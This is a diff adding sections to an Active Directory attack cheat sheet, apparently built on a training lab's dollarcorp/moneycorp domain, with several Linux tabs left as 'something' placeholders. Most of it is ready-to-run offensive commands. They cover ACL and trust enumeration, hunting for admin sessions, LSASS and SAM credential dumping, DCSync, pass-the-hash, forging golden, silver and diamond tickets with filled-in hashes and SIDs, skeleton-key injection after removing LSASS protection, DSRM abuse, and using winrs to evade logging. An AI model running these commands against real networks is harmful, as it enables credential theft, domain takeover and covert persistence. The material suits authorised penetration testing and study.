@@ -463,22 +463,627 @@ nslookup localhost
 		```bash
 		manspider smb_enabled_hosts.txt -f passw -e xlsx csv -d evilcorp -u 'user' -p 'password'
 		```
+### ACL Enumeration
+
+- [ ] Get ACLs for a given object
+
+	=== "Linux"
+	
+		```
+		something
+		```
+	
+	=== "Windows - PowerView"
+	
+		```powershell
+		Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
+		```
+		
+		Specify a prefix to be used for search
+		
+		```powershell
+		Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs - Verbose
+		```
+		
+		Identify interesting ACEs
+		
+		```powershell
+		Find-InterestingDomainAcl -ResolveGUIDs
+		```
+		
+		Get the ACLs for a path
+		
+		```powershell
+		Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
+		```
+	
+	=== "Windows - AD Module"
+	
+		```powershell
+		(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local') .Access
+		```
+
+
+### Domain GPO Enumeration
+
+!!! tip "GPO"
+
+	A GPO is a virtual collection of policy settings, security permissions, and scope of management (SOM) that you can apply to users and computers.
+
+- [ ] Get the list of GPOs in the current domain
+
+	=== "Linux"
+	
+		```bash
+		something
+		```
+	
+	=== "Windows - PowerView"
+	
+		```powershell
+		Get-DomainGPO
+		```
+		
+		```powershell
+		Get-DomainGPO -ComputerIdentity dcorp-student1
+		```
+		
+		Get GPOs which use restricted groups or groups.xml for interesting users
+		
+		```powershell
+		Get-DomainGPOLocalGroup
+		```
+		
+		Get users in a local group of a machine using GPO
+		
+		```powershell
+		Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1
+		```
+		
+		Get machines where the given user is a member of a specific group
+		
+		```powershell
+		Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
+		```
+
+
+### OU Enumeration
+
+=== "Linux"
+
+	```bash
+	something
+	```
+
+=== "Windows - PowerView"
+
+	```powershell
+	Get-DomainOU
+	```
+	
+	Get GPO applied on an OU
+	
+	```powershell
+	Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64- D99597AE2A6E}"
+	```
+
+
+=== "Windows - AD Module"
+
+	```powershell
+	Get-ADOrganizationalUnit -Filter * -Properties *
+	```
+
+### Domain Trust Enumeration
+
+- [ ] Map domain trusts
+
+	=== "Linux"
+	
+		```bash
+		something
+		```
+	
+	=== "Windows - PowerView"
+	
+		Get the trusts for the current domain
+		
+		```powershell
+		Get-DomainTrust
+		```
+		
+		Specify a domain
+		
+		```powershell
+		Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
+		```
+	
+	
+	=== "Windows - AD Module"
+	
+		```powershell
+		Get-ADTrust
+		```
+		
+		```powershell
+		Get-ADTrust -Identity us.dollarcorp.moneycorp.local
+		```
+
+
+- [ ] Map forest trusts
+
+	=== "Linux" 
+	
+		```bash
+		something
+		```
+	
+	=== "Windows"
+	
+		Get details about the current forest
+		
+		```powershell
+		Get-Forest
+		```
+		
+		```powershell
+		Get-Forest -Forest eurocorp.local
+		```
+		
+		```powershell
+		Get-ADForest
+		```
+		
+		```powershell
+		Get-ADForest -Identity eurocorp.local
+		```
+		
+		Get all domains in the current forest
+		
+		```powershell
+		Get-ForestDomain
+		```
+		
+		```powershell
+		Get-ForestDomain -Forest eurocorp.local
+		```
+		
+		```powershell
+		(Get-ADForest).Domains
+		```
+		
+		Get all global catalogs for the current forest
+		
+		```powershell
+		Get-ForestGlobalCatalog
+		```
+		
+		```powershell
+		Get-ForestGlobalCatalog -Forest eurocorp.local
+		```
+		
+		```powershell
+		Get-ADForest | select -ExpandProperty GlobalCatalogs
+		```
+		
+		Map trusts of a forest
+		
+		```powershell
+		Get-ForestTrust
+		```
+		
+		```powershell
+		Get-ForestTrust -Forest eurocorp.local
+		```
+		
+		```powershell
+		Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
+		```
+
+
+### User Hunting
+
+- [ ] Find all machines in the current domain where the current user has local admin access
+
+	```powershell
+	Find-LocalAdminAccess -Verbose
+	```
+
+- [ ] Find computers where a domain admin has sessions (another group can also be specified)
+
+	```powershell
+	Find-DomainUserLocation -Verbose
+	```
+	
+	```powershell
+	Find-DomainUserLocation -UserGroupIdentity "RDPUsers"
+	```
+
+- [ ] Find computers where a domain admin session is available **AND** the current user has local admin access
+
+	```powershell
+	Find-DomainUserLocation -CheckAccess
+	```
+
+- [ ] Find computers where a domain admin session is available
+
+	!!! tip "Stealth"
+	
+		This will look for file servers and distributed file servers
+	
+	```powershell
+	Find-DomainUserLocation -Stealth
+	```
+
+- [ ] List sessions on remote machines
+
+	```powershell
+	Invoke-SessionHunter -FailSafe
+	```
+
+	[Invoke-SessionHunter - GitHub](https://github.com/Leo4j/Invoke-SessionHunter)
+
 
 ## Local Privilege Escalation
 
-something
+!!! warning "Windows Privilege Escalation"
+
+	There are various ways of locally escalating privileges on Windows box: 
+		
+	❌ Missing patches 
+	
+	❌ Automated deployment and AutoLogon passwords in clear text 
+	
+	❌ AlwaysInstallElevated (Any user can run MSI as SYSTEM) 
+	
+	❌ Misconfigured Services 
+	
+	❌ DLL Hijacking and more 
+	
+	❌ Kerberos and NTLM Relaying
+
+
+### Tools
+
+[PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+
+[PrivEscCheck](https://github.com/itm4n/PrivescCheck)
+
+[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+### Escalation
+
+=== "PowerUp"
+
+	Get unquoted service paths
+	
+	```powershell
+	Get-ServiceUnquoted -Verbose
+	```
+	
+	Find services where the current user can write to the binary path or change arguments to the binary
+	
+	```powershell
+	Get-ModifiableServiceFile -Verbose
+	```
+	
+	Get the services whose configurations the current user can modify
+	
+	```powershell
+	Get-ModifiableService -Verbose
+	```
+	
+	Run all checks
+	
+	```powershell
+	Invoke-AllChecks
+	```
+
+=== "PrivescCheck"
+
+	Run all checks
+
+	```powershell
+	Invoke-PrivEscCheck
+	```
+
+=== "WinPEAS"
+
+	Run all checks
+
+	```powershell
+	winPEASx64.exe
+	```
+
 
 ## Admin Recon
 
-Something
+🚧 Under construction
 
 ## Lateral Movement
 
-Something
+### PowerShell Remoting
+
+=== "Windows"
+
+	Execute commands or scriptblocks
+	
+	```powershell
+	Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content $LIST_OF_SERVERS)
+	```
+	
+	Execute scripts from files
+	
+	```powershell
+	Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 - ComputerName (Get-Content $LIST_OF_SERVERS)
+	```
+	
+	Execute locally loaded function on the remote machine
+	
+	```powershell
+	Invoke-Command -ScriptBlock ${function:Get-PassHashes} - ComputerName (Get-Content $LIST_OF_SERVERS)
+	```
+	
+	Pass in positional arguments
+	
+	```powershell
+	Invoke-Command -ScriptBlock ${function:Get-PassHashes} - ComputerName (Get-Content $LIST_OF_SERVERS) - ArgumentList
+	```
+	
+	Execute stateful commands
+	
+	```powershell
+	$Sess = New-PSSession -Computername Server1 
+	Invoke-Command -Session $Sess -ScriptBlock {$Proc = GetProcess} 
+	Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
+	```
+	
+	Use `winrs` to evade logging
+	
+	```powershell
+	winrs -remote:server1 -u:server1\administrator - p:Pass@1234 hostname
+	```
+
+### Credential extraction
+
+#### LSASS
+
+!!! info "LSA"
+
+	Local Security Authority (LSA) is responsible for authentication on a Windows machine. Local Security Authority Subsystem Service (LSASS) is its service.
+
+	Credentials are stored by LSASS when a user: 
+	
+	✅ Logs on to a local session or RDP 
+	
+	✅ Uses RunAs 
+	
+	✅ Run a Windows service 
+	
+	✅ Runs a scheduled task or batch job 
+	
+	✅ Uses a Remote Administration tool
+
+	Certain types of credentials can be extracted without touching LSASS (one of the most heavily monitored Windows processes):
+
+	🔑 SAM hive (Registry) - Local credentials 
+	
+	🔑 LSA Secrets/SECURITY hive (Registry) - Service account passwords, Domain cached credentials etc. 
+	
+	🔑 DPAPI Protected Credentials (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc.
+
+=== "Linux"
+
+	Dump the SAM hive
+	
+	```bash
+	nxc smb $TARGET -u "$USER" -p "$PASSWORD" --sam
+	```
+	
+	Dump LSA secrets
+	
+	```bash
+	nxc smb $TARGET -u "$USER" -p "$PASSWORD" --lsa
+	```
+
+=== "Mimikatz"
+
+	Dump credentials from LSASS
+	
+	```powershell
+	mimikatz.exe -Command '"sekurlsa::ekeys"'
+	```
+	
+	Use safetykatz for a minidump to use with offline mimikatz
+	
+	```powershell
+	SafetyKatz.exe "sekurlsa::ekeys"
+	```
+	
+	Overpass-the-hash with safetykatz
+	
+	```powershell
+	SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256: /run:cmd.exe" "exit"
+	```
+	
+	OPTH with rubeus
+	
+	```powershell
+	Rubeus.exe asktgt /user:administrator /rc4: /ptt
+	```
+	
+	```powershell
+	Rubeus.exe asktgt /user:administrator /aes256: /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+	```
+
+### DCSync
+
+=== "Linux"
+
+	```bash
+	something
+	```
+
+=== "Mimikatz"
+
+	SafetyKatz
+
+	```powershell
+	SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+	```
+
 
 ## Post-DA
 
-Something
+!!! alert "Keep going"
 
+	Once we have DA privileges, escalation to EA opens up other attacks! 
+
+### Persistence Mechanisms
+
+=== "Golden Ticket"
+
+	=== "Linux"
+	
+		```bash
+		something
+		```
+	
+	=== "Windows"
+	
+		Get the KRBTGT hash
+		
+		```powershell
+		C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'
+		```
+		
+		Get the AES hash
+		
+		```powershell
+		C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+		```
+		
+		Forge a golden ticket with attributes similar to a normal TGT
+		
+		```powershell
+		Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+		```
+		
+		```powershell
+		Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA84 8 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948- 3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORPDC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+		```
+
+=== "Silver Ticket"
+
+	=== "Linux"
+	
+		```bash
+		something
+		```
+	
+	=== "Windows"
+	
+		```powershell
+		C:\AD\Tools\Rubeus.exe silver /service:http/dcorpdc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+		```
+
+=== "Diamond Ticket"
+
+	=== "Linux"
+	
+		```bash
+		something
+		```
+	
+	=== "Windows"
+	
+		Create a diamond ticket with AES key
+		
+		```
+		Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+		```
+		
+		Using `tgtdeleg`
+		
+		```powershell
+		Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorpdc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+		```
+		
+
+=== "Skeleton Key"
+
+	!!! danger "Maybe think about not using this"
+	
+		Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
+	
+		Not opsec safe and has been known to cause issues with AD CS.
+	
+		**NOT PERSISTENT ACROSS REBOOTS**
+	
+	=== "Mimikatz"
+	
+	Inject a skeleton key (DA privs required)
+	
+	```powershell
+	SafetyKatz.exe '"privilege::debug" "misc::skeleton"' - ComputerName dcorp-dc.dollarcorp.moneycorp.local
+	```
+
+	Bypass LSASS running as a protected process
+
+	```powershell
+	mimikatz # privilege::debug 
+	mimikatz # !+ 
+	mimikatz # !processprotect /process:lsass.exe /remove 
+	mimikatz # misc::skeleton mimikatz # !-
+	```
+
+=== "DSRM"
+
+	!!! info "Directory Services Restore Mode"
+	
+		There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
+	
+	=== "Linux"
+	
+		```bash
+		something
+		```
+	
+	=== "Windows"
+	
+		Dump DSRM password
+		
+		```powershell
+		SafetyKatz.exe "token::elevate" "lsadump::sam"
+		```
+		
+		Compare the administrator hashes -- first one is the DSRM password
+		
+		```powershell
+		SafetyKatz.exe "lsadump::lsa /patch"
+		```
+		
+		Change the logon behavior of the DSRM account before passing the hash
+		
+		```powershell
+		winrs -r:dcorp-dc cmd
+		
+		# Modify the registry
+		reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
+		```
+
+		Pass the hash of the DSRM administrator and access the DC
+		
+		```powershell
+		SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"
+		```
+		
+		```powershell
+		Set-Item WSMan:\localhost\Client\TrustedHosts $DC_IP
+		```
+		
+		```powershell
+		Enter-PSSession -ComputerName $DC_IP -Authentication NegotiateWithImplicitCredential
+		```
 ## Cross-Trust Attacks
 
